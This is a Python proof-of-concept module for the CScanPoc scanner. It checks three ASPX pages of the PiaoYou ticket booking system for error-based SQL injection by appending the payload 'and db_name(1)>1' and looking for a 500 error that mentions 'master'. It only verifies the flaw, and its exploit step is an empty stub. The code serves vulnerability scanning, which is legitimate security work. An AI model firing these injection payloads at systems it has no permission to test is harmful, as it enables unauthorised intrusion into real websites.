# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0002' # 平台漏洞编号，留空
    name = 'PiaoYou 订票系统注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-17'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '票友订票系统'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'dc3a0c6a-bba9-43d9-8ff5-4eaf1a7bacd7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101565
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101570
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101572
            payload1 = [
                '/newslist.aspx?a=1',
                '/news_view.aspx?a=4',
                '/news_view.aspx?id=4'
            ]
            for payload in payload1:
                verify_url = self.target + payload + '%20and%20db_name%281%29%3E1'
                #code, head, res, errcode, _ = curl.curl2(url)
                r = requests.get(verify_url)

                if r.status_code == 500 and 'master' in r.content :
                    #security_hole(arg + payload + '  :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
